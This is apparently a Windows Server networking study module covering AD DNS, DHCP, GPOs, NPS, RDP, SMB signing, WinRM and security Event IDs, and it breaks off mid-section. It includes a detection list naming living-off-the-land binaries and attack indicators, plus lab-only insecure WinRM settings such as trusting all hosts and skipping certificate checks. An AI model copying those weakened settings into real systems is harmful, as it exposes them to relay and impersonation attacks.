---
title: "Module 07 — Windows Server Networking"
tags: [networking, windows, active-directory, dns, dhcp, smb, winrm, rdp, gpo, event-ids, pentest, netgod]
module: 7
date: 2026-04-05
---

# Module 07 — Windows Server Networking

> [!info] Module Overview
> This module covers Windows Server networking from an engineer's and attacker's perspective. Active Directory DNS internals, Windows DHCP server configuration, GPO-driven network policy, SMB versions and signing, WinRM/PowerShell Remoting, RDP architecture and hardening, RRAS routing and NAT, NPS as a RADIUS server, and complete Windows network troubleshooting. Every section includes critical Event IDs and a full Pentest Lens.

---

## 1. Active Directory Domain Services (AD DS) — Network Fundamentals

### What AD DS Is (Networking Perspective)

Active Directory Domain Services is a **directory service** built on LDAP, Kerberos, and DNS. From a networking perspective, it is a distributed database of objects (users, computers, groups, policies) reachable via specific protocols on specific ports.

Every component of AD communication uses the network — understanding which ports and protocols are involved is essential for both firewall configuration and penetration testing.

### AD Core Protocols and Ports

| Protocol | Port(s) | Transport | Function |
|----------|---------|-----------|---------|
| DNS | 53 | TCP/UDP | Locating DCs, SRV records |
| Kerberos | 88 | TCP/UDP | Authentication |
| RPC Endpoint Mapper | 135 | TCP | Dynamic RPC port negotiation |
| NetBIOS Name Service | 137 | UDP | Legacy name resolution |
| NetBIOS Session | 139 | TCP | Legacy SMB |
| LDAP | 389 | TCP/UDP | Directory queries |
| SMB | 445 | TCP | File sharing, GPO, sysvol |
| Kerberos Password Change | 464 | TCP/UDP | Password changes |
| RPC Dynamic Ports | 49152–65535 | TCP | RPC services (configurable) |
| LDAP over SSL (LDAPS) | 636 | TCP | Encrypted LDAP |
| Global Catalog | 3268 | TCP | Forest-wide LDAP queries |
| Global Catalog SSL | 3269 | TCP | Encrypted GC |
| AD Web Services | 9389 | TCP | PowerShell AD module |

### AD DNS — _msdcs Records, SRV Records, Scavenging

AD-integrated DNS is what makes Active Directory function. Without DNS, clients cannot find Domain Controllers — authentication, GPO processing, and every AD-dependent service fails.

**SRV records for DC discovery**:
```
_ldap._tcp.dc._msdcs.corp.local          → All Domain Controllers (for LDAP)
_ldap._tcp.corp.local                    → All Domain Controllers
_kerberos._tcp.corp.local                → All KDCs
_kerberos._udp.corp.local                → All KDCs (UDP)
_kpasswd._tcp.corp.local                 → KDC for password changes
_gc._tcp.corp.local                      → Global Catalog servers
_ldap._tcp.pdc._msdcs.corp.local         → PDC Emulator (FSMO role)
_ldap._tcp.<siteName>._sites.dc._msdcs.corp.local  → DCs in specific site
```

**_msdcs zone**: A special DNS zone used exclusively by AD. Contains:
- `dc._msdcs.corp.local` — DC locator SRV records
- `<GUID>.domains._msdcs.corp.local` — Forest root domain GUID
- `<DomainGUID>.domains._msdcs.corp.local` — Child domain GUIDs
- CNAME records for DC GUIDs (used by DCs to find each other)

```powershell
# Query SRV records (from any domain-joined machine)
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.corp.local

# Query from Linux
dig SRV _ldap._tcp.dc._msdcs.corp.local
dig SRV _kerberos._tcp.corp.local

# List all DNS zones on a DC
Get-DnsServerZone

# View all records in _msdcs zone
Get-DnsServerResourceRecord -ZoneName _msdcs.corp.local | Format-Table
```

**DNS Scavenging**: Automatically removes stale DNS records — computers that have left the domain but left DNS records behind. Without scavenging, DNS accumulates ghost records over years.

```powershell
# Enable scavenging on the DNS server
Set-DnsServerScavenging -ScavengingState $true -ScavengingInterval 7.00:00:00

# Enable scavenging on a specific zone
Set-DnsServerZoneAging -Name corp.local -Aging $true `
  -NoRefreshInterval 7.00:00:00 `    # Record not refreshed for 7 days = eligible
  -RefreshInterval 7.00:00:00        # Refreshed records remain for 7 more days

# Manually trigger scavenging
Start-DnsServerScavenging

# View scavenging settings
Get-DnsServerScavenging
Get-DnsServerZoneAging -Name corp.local
```

### DC Locator Process — How a Client Finds a DC

Understanding this process is critical for both network engineering (firewall rules) and pentesting (understanding AD traffic flows).

```
1. Client needs to authenticate / join domain
2. Client queries DNS for SRV: _ldap._tcp.dc._msdcs.corp.local
   → DNS returns: dc01.corp.local:389, dc02.corp.local:389
3. Client sends LDAP Ping (CLDAP — Connectionless LDAP) to DCs on UDP 389
   → Includes: client site name, domain GUID
   → DCs respond with: which DC to use, site information
4. Client selects DC in its own site (site-aware DC selection)
5. Client connects to selected DC via LDAP (389) and Kerberos (88)
```

**Site-aware DC selection**: AD sites are defined as groups of subnets. Clients prefer DCs in their own site — closer = faster authentication. Requires correct subnet-to-site mapping in AD Sites and Services.

```powershell
# View AD sites
Get-ADReplicationSite -Filter *

# View site links
Get-ADReplicationSiteLink -Filter *

# View subnet-to-site mappings
Get-ADReplicationSubnet -Filter *

# Find which DC a client is using
nltest /dsgetdc:corp.local
nltest /dsgetdc:corp.local /site:London-Site    # Specific site

# Test DC connectivity
nltest /sc_verify:corp.local    # Verify secure channel to DC
```

---

## 2. Windows DHCP Server — Scopes, Reservations, Options, Failover

### DHCP Server Role Installation

```powershell
# Install DHCP Server role
Install-WindowsFeature -Name DHCP -IncludeManagementTools

# Authorise DHCP server in AD (required — prevents rogue DHCP)
Add-DhcpServerInDC -DnsName dhcp01.corp.local -IPAddress 192.168.1.10

# Verify authorisation
Get-DhcpServerInDC
```

### Scope Configuration

```powershell
# Create scope for office LAN
Add-DhcpServerv4Scope `
  -Name "Office LAN - VLAN10" `
  -StartRange 192.168.10.100 `
  -EndRange 192.168.10.200 `
  -SubnetMask 255.255.255.0 `
  -State Active `
  -LeaseDuration (New-TimeSpan -Hours 8)    # 8-hour lease

# Set scope-level options
Set-DhcpServerv4OptionValue -ScopeId 192.168.10.0 `
  -Router 192.168.10.1 `                   # Option 3 — Default Gateway
  -DnsServer 192.168.1.10,192.168.1.11 `   # Option 6 — DNS servers
  -DnsDomain "corp.local" `                # Option 15 — DNS domain name
  -WinsServer 192.168.1.12                 # Option 44 — WINS (legacy, if needed)

# Set server-level options (apply to all scopes)
Set-DhcpServerv4OptionValue `
  -DnsServer 192.168.1.10,192.168.1.11 `
  -DnsDomain "corp.local"

# Add exclusion range (IPs in scope range that should NOT be assigned)
Add-DhcpServerv4ExclusionRange -ScopeId 192.168.10.0 `
  -StartRange 192.168.10.100 `
  -EndRange 192.168.10.110    # Reserve 100-110 for manual/static assignment

# Verify scope
Get-DhcpServerv4Scope
Get-DhcpServerv4ScopeStatistics -ScopeId 192.168.10.0
```

### Reservations (Always Same IP for Specific Device)

```powershell
# Create reservation (MAC → IP mapping)
Add-DhcpServerv4Reservation `
  -ScopeId 192.168.10.0 `
  -IPAddress 192.168.10.50 `
  -ClientId "AA-BB-CC-DD-EE-FF" `          # MAC address (hyphen-separated)
  -Description "Reception Printer" `
  -Name "Printer-Reception"

# View all reservations
Get-DhcpServerv4Reservation -ScopeId 192.168.10.0

# Remove reservation
Remove-DhcpServerv4Reservation -ScopeId 192.168.10.0 -IPAddress 192.168.10.50
```

### DHCP Failover (High Availability)

Windows Server DHCP failover replicates scope data between two DHCP servers. If one fails, the other continues assigning leases.

**Two modes**:
- **Hot standby**: Primary handles all requests. Standby only activates if primary unreachable.
- **Load balance**: Both servers share the load (configurable split — default 50/50).

```powershell
# Configure DHCP failover between two servers
Add-DhcpServerv4Failover `
  -Name "OfficeFailover" `
  -PartnerServer dhcp02.corp.local `
  -ScopeId 192.168.10.0 `
  -Mode LoadBalance `
  -LoadBalancePercent 50 `
  -SharedSecret "FailoverSecret123" `
  -AutoStateTransition $true `
  -MaxClientLeadTime (New-TimeSpan -Hours 1)

# View failover config
Get-DhcpServerv4Failover

# Force replication to partner
Invoke-DhcpServerv4FailoverReplication -Name "OfficeFailover"
```

### Active Lease Management

```powershell
# View all active leases
Get-DhcpServerv4Lease -ScopeId 192.168.10.0

# Find lease for specific IP
Get-DhcpServerv4Lease -ScopeId 192.168.10.0 -IPAddress 192.168.10.150

# Find lease for specific MAC
Get-DhcpServerv4Lease -ScopeId 192.168.10.0 | Where-Object {$_.ClientId -eq "AA-BB-CC-DD-EE-FF"}

# Release a lease (force client to get new IP)
Remove-DhcpServerv4Lease -ScopeId 192.168.10.0 -IPAddress 192.168.10.150

# Export all leases (for migration or backup)
Export-DhcpServer -File C:\dhcp-backup.xml -Leases

# Import
Import-DhcpServer -File C:\dhcp-backup.xml -BackupPath C:\dhcp-backup -Leases
```

### Key DHCP Options Reference

| Option | Number | Description | Example |
|--------|--------|-------------|---------|
| Subnet Mask | 1 | Network mask | 255.255.255.0 |
| Router | 3 | Default gateway | 192.168.1.1 |
| DNS Server | 6 | DNS server IPs | 192.168.1.10 |
| DNS Domain | 15 | Default search domain | corp.local |
| NTP Server | 42 | Time server | 192.168.1.10 |
| WINS Server | 44 | NetBIOS name server | 192.168.1.12 |
| NetBIOS Node Type | 46 | 0x2=P-node (disable broadcast) | 0x2 |
| WPAD | 252 | Web proxy auto-discovery URL | http://proxy.corp.local/wpad.dat |

---

## 3. GPOs for Network Configuration

Group Policy Objects (GPOs) are the primary mechanism for enforcing network configuration across all domain-joined machines. GPOs apply to OUs (Organisational Units) and process in this order: Local → Site → Domain → OU (LSDOU).

### GPO Processing and Network Dependency

GPO processing requires network connectivity to a DC. Understanding this is important:
- **At startup**: Computer GPOs applied — requires DC to be reachable
- **At logon**: User GPOs applied — requires DC to be reachable
- **Background refresh**: Every 90 minutes (±30 min randomisation) — keeps settings current

```powershell
# Force immediate GPO refresh
gpupdate /force                   # Both computer and user
gpupdate /force /target:computer  # Computer GPO only
gpupdate /force /target:user      # User GPO only

# View applied GPOs
gpresult /r            # Summary (text output)
gpresult /h C:\gpo-report.html    # Detailed HTML report
gpresult /v            # Verbose text output

# Check GPO event log (Application and Services → Microsoft → Windows → GroupPolicy)
Get-WinEvent -LogName "Microsoft-Windows-GroupPolicy/Operational" | 
  Select-Object -First 20 | Format-List TimeCreated, Message
```

### Firewall GPO

```
Path: Computer Configuration → Windows Settings → Security Settings →
      Windows Defender Firewall with Advanced Security

Key settings:
- Firewall state (on/off per profile)
- Default inbound/outbound action
- Inbound/Outbound rules
- Connection security rules (IPsec)
```

```powershell
# Create firewall GPO rule via PowerShell (run on DC)
$gpo = New-GPO -Name "Workstation Firewall Policy"
$gpoSession = Open-NetGPO -PolicyStore "corp.local\Workstation Firewall Policy"

New-NetFirewallRule -GPOSession $gpoSession `
  -Name "Block SMB Inbound" `
  -DisplayName "Block SMB Inbound - Workstations" `
  -Direction Inbound `
  -Action Block `
  -Protocol TCP `
  -LocalPort 445

Save-NetGPO -GPOSession $gpoSession

# Link GPO to Workstations OU
New-GPLink -Name "Workstation Firewall Policy" -Target "OU=Workstations,DC=corp,DC=local"
```

### Proxy Settings via GPO

```
Path: User Configuration → Administrative Templates → Windows Components →
      Internet Explorer → Internet Control Panel → Connections → LAN Settings

Or: Computer Configuration → Administrative Templates → Windows Settings →
    Proxy settings (for machine-wide proxy)
```

For WPAD (Web Proxy Auto-Discovery):
```
Set DHCP option 252: http://wpad.corp.local/wpad.dat
Or DNS: Create A record for 'wpad' pointing to your proxy server
The proxy server serves /wpad.dat (JavaScript file defining proxy settings)
```

### Wireless Profile Deployment via GPO

```
Path: Computer Configuration → Windows Settings → Security Settings →
      Wireless Network (IEEE 802.11) Policies

Creates a wireless profile pushed to all machines — SSID, security type,
EAP settings for 802.1X WPA2-Enterprise (PEAP or EAP-TLS with certs)
```

```powershell
# Export wireless profile from a configured machine
netsh wlan export profile name="CorpWiFi" folder=C:\

# Import profile manually on another machine
netsh wlan add profile filename="C:\Wi-Fi-CorpWiFi.xml" interface="Wi-Fi"

# Via GPO: Import the exported XML into the wireless policy in GPMC
```

### Drive Mapping via GPO (Requires Network Access)

```
Path: User Configuration → Preferences → Windows Settings → Drive Maps

Maps network shares to drive letters on logon.
Uses item-level targeting to map different drives for different groups.
```

### DNS Client Settings via GPO

```
Path: Computer Configuration → Administrative Templates → Network →
      DNS Client

Settings:
- DNS Suffix Search List (domain suffix to append to unqualified queries)
- DNS Servers (override DHCP-assigned DNS)
- Enable LLMNR → Disabled (security hardening — disable LLMNR via GPO)
- Turn off multicast name resolution → Enabled
```

---

## 4. Windows Routing — Static Routes, RRAS, NAT

### Static Routes (Windows Server / Client)

```powershell
# View routing table
Get-NetRoute
route print          # Classic command, still widely used

# Add persistent static route
New-NetRoute -DestinationPrefix 10.10.0.0/16 -NextHop 192.168.1.254 -InterfaceAlias Ethernet -RouteMetric 10

# Or using route command (persistent with -p)
route add 10.10.0.0 mask 255.255.0.0 192.168.1.254 -p    # -p = persistent

# Delete route
Remove-NetRoute -DestinationPrefix 10.10.0.0/16
route delete 10.10.0.0

# Verify
Get-NetRoute -DestinationPrefix 10.10.0.0/16
```

### RRAS — Routing and Remote Access Service

RRAS enables a Windows Server to function as a router and/or VPN server.

```powershell
# Install RRAS
Install-WindowsFeature -Name RemoteAccess -IncludeManagementTools
Install-WindowsFeature -Name Routing -IncludeManagementTools

# Configure RRAS as LAN router (not VPN)
Install-RemoteAccess -VpnType RoutingOnly

# Configure NAT
Install-RemoteAccess -VpnType RoutingOnly
# Then via RRAS console: IPv4 → NAT → Add interface → select external interface → enable NAT

# Alternatively via netsh (legacy but works)
netsh routing ip nat install
netsh routing ip nat add interface "Ethernet" full
netsh routing ip nat add interface "Ethernet 2" private
```

### Enable IP Routing in Windows Registry

```powershell
# Enable IPv4 routing (required for RRAS/routing to work)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" `
  -Name "IPEnableRouter" -Value 1

# Verify
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" `
  -Name "IPEnableRouter"
```

---

## 5. NPS — Network Policy Server (RADIUS)

NPS is the Microsoft implementation of RADIUS. Used for:
- 802.1X authentication (wired and wireless)
- VPN authentication
- Wi-Fi authentication with WPA2-Enterprise

### NPS Installation and Configuration

```powershell
# Install NPS
Install-WindowsFeature -Name NPAS -IncludeManagementTools

# Register NPS in AD (required to read dial-in permissions from AD user objects)
netsh nps add registeredserver domain=corp.local server=nps01.corp.local
# Or via NPS console: right-click NPS → Register server in Active Directory
```

### NPS Configuration Elements

**RADIUS Clients**: Network devices (switches, APs, VPN concentrators) that will send RADIUS requests to NPS.

```powershell
# Add RADIUS client (the authenticator — switch or AP)
New-NpsRadiusClient `
  -Address 192.168.1.50 `           # Switch IP
  -Name "CoreSwitch01" `
  -SharedSecret "RadiusSecret123" ` # Must match switch config
  -VendorName "Cisco"               # Vendor-specific attributes

# View RADIUS clients
Get-NpsRadiusClient
```

**Network Policies**: Define who gets access and under what conditions.

```
Conditions:
  - Windows Groups: Domain Users, or specific security group
  - NAS Port Type: Ethernet (wired 802.1X) or Wireless IEEE 802.11
  - Client IP Address: range of switch/AP IPs

Constraints:
  - Authentication Method: PEAP-MSCHAPv2, EAP-TLS
  - Time restrictions

Settings:
  - VLAN assignment: Tunnel-Type=VLAN (64), Tunnel-Medium-Type=IEEE-802 (65),
                     Tunnel-Private-Group-ID=<VLAN ID> (81)
  - Access: Grant/Deny
```

### Dynamic VLAN Assignment via RADIUS

When a user authenticates via 802.1X, NPS can tell the switch which VLAN to put them in — based on group membership.

```
NPS Network Policy → Settings → RADIUS Attributes → Standard:
  Tunnel-Type (64):            Value=13 (VLAN)
  Tunnel-Medium-Type (65):     Value=6 (IEEE 802)
  Tunnel-Private-Group-ID (81): Value=10  (← VLAN number)

When an Engineering group member authenticates → VLAN 10
When an HR group member authenticates → VLAN 20
```

### NPS Logging

```powershell
# NPS logs authentication attempts to:
# C:\Windows\System32\LogFiles\IN*.log (IAS format by default)

# Enable SQL logging (for SIEM integration)
# NPS Console → Accounting → Configure Accounting → SQL Server Logging

# View NPS event log
Get-WinEvent -LogName "Security" | Where-Object {$_.Id -in 6272,6273,6274,6275,6276,6277,6278}

# Key NPS Event IDs:
# 6272 - Network Policy Server granted access to a user
# 6273 - Network Policy Server denied access to a user
# 6274 - Network Policy Server discarded the request for a user
# 6275 - Network Policy Server discarded the accounting request for a user
# 6276 - Network Policy Server quarantined a user
# 6278 - Network Policy Server granted full access to a user because the host met the defined health policy
```

---

## 6. RDS and RDP — Architecture, Gateway, NLA, Hardening

### RDP Architecture

```
Standard RDP (direct):
[Client] ──TCP 3389──> [Windows Server/Workstation]

RD Gateway (HTTPS tunnel):
[Remote Client] ──HTTPS (443)──> [RD Gateway Server] ──RDP──> [Internal Server]
  (internet)                     (DMZ or perimeter)            (internal network)
```

**RD Gateway** wraps RDP inside HTTPS (port 443). Remote workers connect via HTTPS — no need to expose port 3389 to the internet. The Gateway authenticates the user, then proxies the RDP connection to the internal target.

### RDP Configuration and Hardening

```powershell
# Enable RDP
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
  -Name "fDenyTSConnections" -Value 0

# Enable NLA (Network Level Authentication)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
  -Name "UserAuthentication" -Value 1

# Set RDP encryption level (3 = High — 128-bit RC4 or RDP Security Layer)
# Better: use TLS via Group Policy — "Require use of specific security layer" → SSL(TLS)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
  -Name "SecurityLayer" -Value 2     # 2 = SSL/TLS

# Change RDP port (minor obscurity)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
  -Name "PortNumber" -Value 13389

# Restrict RDP to specific users/groups
# Computer Configuration → Windows Settings → Security Settings →
# Local Policies → User Rights Assignment → "Allow log on through Remote Desktop Services"
# Remove "Remote Desktop Users", add your specific restricted group

# Allow RDP through Windows Firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Or restrict to specific source IP range
$rule = Get-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)"
$rule | Get-NetFirewallAddressFilter | Set-NetFirewallAddressFilter -RemoteAddress 10.0.100.0/24

# Disable RDP
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
  -Name "fDenyTSConnections" -Value 1
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### RDP Key Event IDs

| Event ID | Log | Description |
|---------|-----|-------------|
| 4624 (Type 10) | Security | Successful RDP logon (Logon Type 10 = RemoteInteractive) |
| 4625 (Type 10) | Security | Failed RDP logon |
| 4778 | Security | Session reconnected (RDP session reconnect) |
| 4779 | Security | Session disconnected |
| 21 | Microsoft-Windows-TerminalServices-LocalSessionManager/Operational | RDP logon successful |
| 23 | TerminalServices-LocalSessionManager | RDP session logoff |
| 24 | TerminalServices-LocalSessionManager | RDP session disconnected |
| 25 | TerminalServices-LocalSessionManager | RDP session reconnected |
| 1149 | TerminalServices-RemoteConnectionManager | RDP user authentication succeeded |

```powershell
# View RDP logon events
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | 
  Where-Object {$_.Properties[8].Value -eq 10} |    # LogonType = 10 (RemoteInteractive)
  Select-Object TimeCreated, @{n="User";e={$_.Properties[5].Value}},
    @{n="Source";e={$_.Properties[18].Value}} |
  Format-Table

# View RDP connection events
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" |
  Where-Object {$_.Id -eq 1149} | Format-List TimeCreated, Message
```

---

## 7. SMB — Versions, Signing, Encryption

### SMB Version History

| Version | OS Introduced | Key Features | Status |
|---------|--------------|-------------|--------|
| SMB 1.0 | Windows NT 4.0 | Basic file sharing | **Deprecated — disable immediately** |
| SMB 2.0 | Windows Vista/2008 | Improved performance, reduced commands | Acceptable |
| SMB 2.1 | Windows 7/2008R2 | Large MTU, BranchCache | Acceptable |
| SMB 3.0 | Windows 8/2012 | Multichannel, end-to-end encryption, RDMA | Preferred |
| SMB 3.02 | Windows 8.1/2012R2 | Disable SMB1 capability | Preferred |
| SMB 3.1.1 | Windows 10/2016 | Pre-auth integrity (prevents downgrade), AES-128-GCM | Best |

### Disabling SMBv1 (Critical Security Task)

SMBv1 is exploitable by EternalBlue (MS17-010 — WannaCry, NotPetya). **Disable it everywhere.**

```powershell
# Disable SMBv1 on Server
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Disable SMBv1 on Client
Set-SmbClientConfiguration -EnableSMB1Protocol $false -Force

# Verify
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol
Get-SmbClientConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol

# Alternative (registry-based — for older systems)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
  -Name "SMB1" -Value 0

# Detect SMBv1 usage before disabling (audit for clients still using it)
Get-SmbSession | Where-Object {$_.Dialect -like "1*"}

# Remove SMBv1 feature entirely (Windows 10 1709+ / Server 2019+)
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
```

### SMB Signing

SMB signing cryptographically signs every SMB packet, preventing NTLM relay attacks and MITM tampering with file transfers.

```powershell
# Enable required signing on server (all clients must sign)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Enable required signing on client (only connect to servers that sign)
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Verify current signing configuration
Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature
Get-SmbClientConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature

# Via GPO (preferred for domain-wide enforcement):
# Computer Configuration → Windows Settings → Security Settings →
#   Local Policies → Security Options:
# "Microsoft network server: Digitally sign communications (always)" → Enabled
# "Microsoft network client: Digitally sign communications (always)" → Enabled
```

> [!danger] NTLM Relay Without SMB Signing
> If SMB signing is not required, captured NTLM authentication (from Responder/LLMNR poisoning) can be relayed to other SMB servers — granting access without knowing the password. SMB signing enforcement completely defeats relay attacks. Enable it everywhere.

### SMB Encryption (SMB 3.0+)

SMB encryption encrypts all SMB traffic end-to-end, even on LAN. Prevents packet capture of file contents.

```powershell
# Enable encryption for all shares on a server
Set-SmbServerConfiguration -EncryptData $true -Force

# Enable encryption for a specific share only
Set-SmbShare -Name "Sensitive-Share" -EncryptData $true

# Require encryption on the client side (reject unencrypted connections)
Set-SmbClientConfiguration -RequireEncryption $true

# Check current encryption status of active sessions
Get-SmbSession | Select-Object ClientComputerName, Dialect, Encrypted

# Verify share encryption
Get-SmbShare -Name "Sensitive-Share" | Select-Object Name, EncryptData
```

### SMB Share Management

```powershell
# Create SMB share
New-SmbShare -Name "Finance" -Path "D:\Shares\Finance" `
  -FullAccess "CORP\Finance-Managers" `
  -ReadAccess "CORP\Finance-Users" `
  -Description "Finance department share" `
  -EncryptData $true `
  -FolderEnumerationMode AccessBased    # Hide files user cannot access

# View all shares
Get-SmbShare

# View active connections to shares
Get-SmbSession
Get-SmbOpenFile    # Files currently open

# Enumerate shares on remote host
Get-SmbShare -CimSession 192.168.1.10
net view \\192.168.1.10 /all    # Include hidden shares (ADMIN$, C$, IPC$)
```

### Administrative Shares

Windows automatically creates administrative shares that are accessible to local administrators:

| Share | Maps To | Purpose |
|-------|---------|---------|
| `ADMIN$` | `C:\Windows` | Remote administration |
| `C$` | `C:\` | Default drive share |
| `D$` | `D:\` | Other drives |
| `IPC$` | Named pipes | RPC communication |
| `SYSVOL` | AD sysvol | GPO and logon scripts |
| `NETLOGON` | AD netlogon | Logon scripts |

```powershell
# Disable default administrative shares (not recommended — breaks many tools)
# Better: restrict access via firewall and network segmentation

# Check if admin shares are accessible (from another machine)
Test-Path \\192.168.1.10\ADMIN$
net use \\192.168.1.10\ADMIN$
```

---

## 8. WinRM and PowerShell Remoting

### What WinRM Is

WinRM (Windows Remote Management) is Microsoft's implementation of the WS-Management protocol. PowerShell Remoting uses WinRM as its transport.

**Ports**:
| Protocol | Port | Notes |
|----------|------|-------|
| WinRM HTTP | 5985 | Cleartext (but Kerberos/NTLM auth encrypted within) |
| WinRM HTTPS | 5986 | TLS encrypted transport |

### Enabling WinRM

```powershell
# Enable WinRM with default settings (HTTP on 5985, listens on all IPs)
Enable-PSRemoting -Force

# What Enable-PSRemoting does:
# 1. Starts WinRM service, sets to automatic
# 2. Creates WinRM listener on HTTP 5985
# 3. Adds firewall rule to allow WinRM
# 4. Sets LocalAccountTokenFilterPolicy if needed

# Verify WinRM is running
Get-Service WinRM
Get-WSManInstance -ResourceURI winrm/config/listener -SelectorSet @{Address='*';Transport='HTTP'}
winrm enumerate winrm/config/listener

# Test WinRM connectivity
Test-WSMan 192.168.1.10
Test-WSMan 192.168.1.10 -Authentication Kerberos
```

### WinRM HTTPS Configuration (Production — Required for Security)

```powershell
# ─── ON THE SERVER ──────────────────────────────────────────────────────────

# Create self-signed cert (use CA-signed in production)
$cert = New-SelfSignedCertificate -Subject "CN=server01.corp.local" `
  -CertStoreLocation Cert:\LocalMachine\My `
  -KeyUsage DigitalSignature, KeyEncipherment `
  -Type SSLServerAuthentication

# Create HTTPS listener
New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address * `
  -CertificateThumbprint $cert.Thumbprint -Force

# Add HTTPS firewall rule
New-NetFirewallRule -DisplayName "WinRM HTTPS" `
  -Direction Inbound -Action Allow `
  -Protocol TCP -LocalPort 5986 `
  -RemoteAddress 10.0.100.0/24    # Management network only

# ─── ON THE CLIENT ───────────────────────────────────────────────────────────

# Connect to remote server via HTTPS
$session = New-PSSession -ComputerName server01.corp.local -UseSSL `
  -Credential (Get-Credential)

# If self-signed cert (for lab) — skip verification
$session = New-PSSession -ComputerName server01 -UseSSL `
  -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck) `
  -Credential (Get-Credential)

# Enter interactive session
Enter-PSSession -Session $session

# Run command on remote machine
Invoke-Command -ComputerName server01.corp.local -ScriptBlock {Get-Process}

# Run command on multiple machines simultaneously
Invoke-Command -ComputerName server01,server02,server03 `
  -ScriptBlock {Get-Service | Where-Object Status -eq "Running" | Select-Object Name,Status}

# Copy file to/from remote session
Copy-Item -Path C:\local\file.txt -Destination C:\remote\file.txt `
  -ToSession $session

# Close session
Remove-PSSession -Session $session
```

### Trusted Hosts (Non-Domain Environments)

On non-domain machines, WinRM uses Trusted Hosts to determine which servers to accept authentication challenges from.

```powershell
# Add specific host to trusted hosts (required when no Kerberos — workgroup/different domain)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.10" -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*.corp.local" -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force    # Trust all — lab only

# View trusted hosts
Get-Item WSMan:\localhost\Client\TrustedHosts
```

---

## 9. Critical Windows Event IDs for Network Security

### Complete Event ID Reference

```
──── AUTHENTICATION ────────────────────────────────────────────────────────────

4624  Successful logon
      Properties[8].Value = LogonType
      LogonType 2=Interactive, 3=Network, 4=Batch, 5=Service,
                7=Unlock, 9=NewCredentials, 10=RemoteInteractive(RDP),
                11=CachedInteractive

4625  Failed logon
      Properties[10].Value = FailureReason
      Status/SubStatus codes: 0xC000006A=wrong password, 0xC0000064=no such user,
      0xC000006D=wrong username/auth, 0xC000006F=outside logon hours,
      0xC0000070=workstation restriction, 0xC000006C=password policy violation

4634  Logoff
4647  User initiated logoff (interactive)
4648  Logon with explicit credentials (runas, net use with credentials)
      → Lateral movement indicator when from unexpected source
4649  Replay attack detected (Kerberos)
4672  Special privileges assigned to new logon (admin-equivalent rights)
      → Alert when assigned to non-admin accounts

──── KERBEROS ──────────────────────────────────────────────────────────────────

4768  Kerberos authentication ticket (TGT) was requested
      TicketEncryptionType: 0x17=RC4 (weak), 0x12=AES256 (strong)
      Alert: RC4 TGT requests from non-legacy systems = possible AS-REP roasting prep

4769  Kerberos service ticket (TGS) was requested
      TicketEncryptionType: 0x17=RC4
      Alert: Many 4769 events with RC4 in short time = Kerberoasting

4770  Kerberos ticket was renewed

4771  Kerberos pre-authentication failed
      FailureCode: 0x12=client's credentials have been revoked,
                   0x18=wrong password, 0x25=clock skew too great

──── ACCOUNT MANAGEMENT ────────────────────────────────────────────────────────

4720  User account created
4722  User account enabled
4723  Password change attempt (by the user)
4724  Password reset (by admin)
4725  User account disabled
4726  User account deleted
4728  Member added to security-enabled global group
4732  Member added to security-enabled local group
4756  Member added to security-enabled universal group
      Alert: Addition to Domain Admins, Enterprise Admins, Schema Admins

──── PROCESS AND SERVICE ────────────────────────────────────────────────────────

4688  New process created
      Alert: powershell.exe, cmd.exe, wscript.exe, cscript.exe, mshta.exe,
             regsvr32.exe, rundll32.exe, certutil.exe (LOLBins)

4698  Scheduled task created
4702  Scheduled task updated
4699  Scheduled task deleted (attacker may delete after running)
7045  New service installed (System log)
      Alert: Any new service — possible persistence mechanism

──── POLICY AND AUDIT ──────────────────────────────────────────────────────────

4719  System audit policy changed — alert immediately (attacker disabling logging)
4906  CrashOnAuditFail value changed
1102  Audit log cleared (Security log) — alert immediately
104   System log cleared (System log) — alert immediately

──── NETWORK / FIREWALL ────────────────────────────────────────────────────────

5140  Network share accessed
5145  Network share object access check (detailed share access)
5156  Windows Filtering Platform permitted a connection
5157  Windows Filtering Platform blocked a connection
5158  WFP permitted bind to local port
4946  Windows Firewall rule added
4947  Windows Firewall rule modified
4948  Windows Firewall rule deleted

──── LOGON TYPES REFERENCE ────────────────────────────────────────────────────

Type 2:  Interactive (console logon)
Type 3:  Network (net use, SMB, WMI)
Type 4:  Batch (scheduled task)
Type 5:  Service (service account logon)
Type 7:  Unlock (screensaver unlock)
Type 9:  NewCredentials (runas /netonly)
Type 10: RemoteInteractive (RDP)
Type 11: CachedInteractive (cached domain credentials, offline logon)
```

### PowerShell Event ID Queries

```powershell
# Detect failed logons (brute force) — more than 10 in last hour from same source
